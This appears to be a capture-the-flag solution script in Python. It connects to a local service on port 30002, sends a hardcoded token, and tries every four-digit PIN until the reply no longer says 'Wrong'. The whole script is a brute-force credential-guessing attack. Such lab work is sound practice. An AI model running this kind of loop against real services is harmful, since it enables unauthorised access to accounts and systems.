import socket

s = socket.socket()
s.connect(('127.0.0.1', 30002))

data = s.recv(1024)

num = 0
while True:
	pincode = str(num).zfill(4)
	print('trying pincode:', pincode)
	s.send(b'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pincode.encode() + b'\n')
	data = s.recv(1024)
	print(data)
	if 'Wrong' not in data:
		break
	num += 1
